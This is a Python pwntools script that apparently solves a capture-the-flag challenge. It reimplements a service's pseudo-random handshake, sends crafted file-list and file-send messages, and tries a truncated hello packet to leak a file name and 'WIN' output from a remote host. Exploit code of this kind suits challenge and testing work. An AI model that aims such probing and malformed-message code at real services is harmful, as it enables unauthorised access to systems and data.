#!/usr/bin/env python3
from pwn import *


def mk_io():
    return remote('nmdfthufjskdnbfwhejklacms.xyz', 19834)


def next_seed(seed):
    seed = (seed * 0x41c64e6d)
    if seed < 0xffffffff:
        raise Exception()
    seed = seed & 0xffffffff
    seed = (seed + 0x3039) & 0xffffffff
    return seed


def send_hello(io):
    seed = 0x6fffcfc8  # GetTickCount
    seed = next_seed(seed)
    hello = [seed & 0x7f]
    for _ in range(hello[0]):
        seed = next_seed(seed)
        hello.append(seed & 0xff)
    hello = bytes(hello)
    io.send(flat({
        0x0: b'\x40',
        0x1: hello,
    }))
    reply = io.recvn(hello[0])
    assert reply == hello[1:], (reply, hello[1:])
    return reply


def send_n_files(io, n_files):
    io.send(flat({
        0x0: b'\x4c',
        0x1: bytes((n_files,))
    }))


def send_file_name(io, file_name):
    io.send(flat({
        0x0: bytes((len(file_name),)),
        0x1: file_name,
    }))


def send_longest_file_list(io):
    n_files = 0xff
    send_n_files(io, n_files)
    file_name_length = 0xff
    for i in range(n_files):
        file_name = ''.join(random.choices(string.ascii_letters, k=file_name_length))
        send_file_name(io, file_name)
    count, = io.recvn(1)
    print(io.recvn(count))


def send_file(io, data):
    io.send(flat({
        0x0: b'\x66',
        0x1: bytes((len(data),)),
        0x2: data,
    }))


def recv_file_name(io):
    count, = io.recvn(1)
    return io.recvn(count)


def send_file_names(io, file_names):
    send_n_files(io, len(file_names))
    for file_name in file_names:
        send_file_name(io, file_name)
    return recv_file_name(io)


io = mk_io()
try:
    send_hello(io)
finally:
    io.close()

if 1:
    io = mk_io()
    try:
        io.send(b'\x40\xff')
        io.shutdown('send')
        file_name = recv_file_name(io)
        print(f'WANT: {file_name}')
        try:
            print(f'WIN: {io.recv()}')
        except EOFError:
            pass
    finally:
        io.close()

if 0:
    io = mk_io()
    try:
        send_file(io, b'\x00' * 255)
        try:
            print(f'WIN: {io.recv()}')
        except EOFError:
            pass
    finally:
        io.close()
